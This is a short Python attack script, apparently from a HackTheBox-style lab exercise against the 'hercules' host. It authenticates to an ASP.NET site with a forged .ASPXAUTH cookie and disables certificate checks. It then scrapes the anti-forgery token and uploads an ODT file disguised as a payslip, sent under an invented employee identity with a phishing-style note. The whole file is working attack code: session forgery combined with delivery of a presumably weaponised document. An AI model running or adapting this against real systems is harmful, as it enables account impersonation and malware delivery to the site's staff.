#!/usr/bin/env python3
import re, sys, requests, urllib3
urllib3.disable_warnings()

BASE = "https://10.129.242.196"
COOKIE = sys.argv[1] if len(sys.argv) > 1 else "/home/kali/hercules/forged.cookie"
ODT = sys.argv[2] if len(sys.argv) > 2 else "/home/kali/hercules/payslip.odt"

s = requests.Session(); s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.cookies.set(".ASPXAUTH", open(COOKIE).read().strip(), domain="10.129.242.196")

r = s.get(f"{BASE}/Home/Forms", timeout=20)
tok = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text).group(1)

files = {"UploadedFile": ("payslip.odt", open(ODT, "rb"),
                          "application/vnd.oasis.opendocument.text")}
data = {"Name": "Ken", "Email": "ken.w@hercules.htb",
        "Description": "Please review my attached payslip document, thanks!",
        "__RequestVerificationToken": tok}

r2 = s.post(f"{BASE}/Home/Forms", data=data, files=files, timeout=60)
print("status:", r2.status_code, "len:", len(r2.text))
body = re.sub(r'<script.*?</script>', ' ', r2.text, flags=re.S | re.I)
body = re.sub(r'<[^>]+>', ' ', body)
body = re.sub(r'\s+', ' ', body)
i = body.find("Report Submission")
print(body[i:i+400] if i >= 0 else body[:600])
for kw in ("success", "error", "invalid", "not allowed", "uploaded", "received", "extension"):
    for m in re.finditer(kw, body, re.I):
        print(f"  [{kw}] ...{body[max(0,m.start()-100):m.start()+120]}...")
        break
